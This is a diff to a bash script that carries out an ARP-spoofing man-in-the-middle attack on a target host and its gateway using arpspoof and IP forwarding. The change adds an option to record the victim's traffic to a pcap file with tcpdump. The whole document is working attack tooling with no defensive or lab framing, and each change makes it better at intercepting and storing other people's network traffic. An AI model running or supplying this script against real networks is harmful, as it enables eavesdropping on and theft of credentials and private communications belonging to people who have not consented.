@@ -1,5 +1,5 @@
 #!/bin/bash
-# arp spoof - mitm between target and gateway
+# arp spoof with optional traffic capture
 
 if [ "$EUID" -ne 0 ]; then
     echo "run as root"
@@ -7,7 +7,8 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 show_usage() {
-    echo "usage: ./spoof.sh [-i interface] <target_ip> <gateway_ip>"
+    echo "usage: ./spoof.sh [-i iface] [-c capfile] <target> <gateway>"
+    echo "  -c  capture traffic to pcap file"
 }
 
 get_mac() {
@@ -21,9 +22,11 @@ get_default_iface() {
 }
 
 iface=""
-while getopts "i:h" opt; do
+capfile=""
+while getopts "i:c:h" opt; do
     case $opt in
         i) iface="$OPTARG" ;;
+        c) capfile="$OPTARG" ;;
         h) show_usage; exit 0 ;;
         *) show_usage; exit 1 ;;
     esac
@@ -32,41 +35,39 @@ shift $((OPTIND - 1))
 
 target="$1"
 gateway="$2"
-
 [ -z "$target" ] || [ -z "$gateway" ] && { show_usage; exit 1; }
 [ -z "$iface" ] && iface=$(get_default_iface)
 
-if ! command -v arpspoof &>/dev/null; then
-    echo "arpspoof not found (install dsniff)"
-    exit 1
-fi
+for cmd in arpspoof; do
+    if ! command -v $cmd &>/dev/null; then
+        echo "$cmd not found"
+        exit 1
+    fi
+done
 
-echo "resolving targets..."
+echo "resolving..."
 target_mac=$(get_mac "$target")
 gateway_mac=$(get_mac "$gateway")
 
-if [ -z "$target_mac" ] || [ "$target_mac" = "(incomplete)" ]; then
-    echo "could not resolve target $target"
-    exit 1
-fi
-
-if [ -z "$gateway_mac" ] || [ "$gateway_mac" = "(incomplete)" ]; then
-    echo "could not resolve gateway $gateway"
-    exit 1
-fi
+[ -z "$target_mac" ] || [ "$target_mac" = "(incomplete)" ] && { echo "cannot reach $target"; exit 1; }
+[ -z "$gateway_mac" ] || [ "$gateway_mac" = "(incomplete)" ] && { echo "cannot reach $gateway"; exit 1; }
 
 echo "target:  $target ($target_mac)"
 echo "gateway: $gateway ($gateway_mac)"
 echo "iface:   $iface"
+[ -n "$capfile" ] && echo "capture: $capfile"
 echo ""
 
-echo "enabling ip forwarding..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
+
+pids=()
 
 cleanup() {
     echo ""
-    echo "stopping spoof..."
-    kill $pid1 $pid2 2>/dev/null
+    echo "stopping..."
+    for p in "${pids[@]}"; do
+        kill "$p" 2>/dev/null
+    done
     echo 0 > /proc/sys/net/ipv4/ip_forward
     echo "restored"
     exit 0
@@ -74,10 +75,16 @@ cleanup() {
 
 trap cleanup INT TERM
 
-echo "spoofing... (ctrl+c to stop)"
-arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
-pid1=$!
-arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
-pid2=$!
+if [ -n "$capfile" ]; then
+    tcpdump -i "$iface" -w "$capfile" host "$target" &>/dev/null &
+    pids+=($!)
+    echo "capturing traffic to $capfile"
+fi
 
-wait $pid1 $pid2
+arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
+pids+=($!)
+arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
+pids+=($!)
+
+echo "spoofing... (ctrl+c to stop)"
+wait
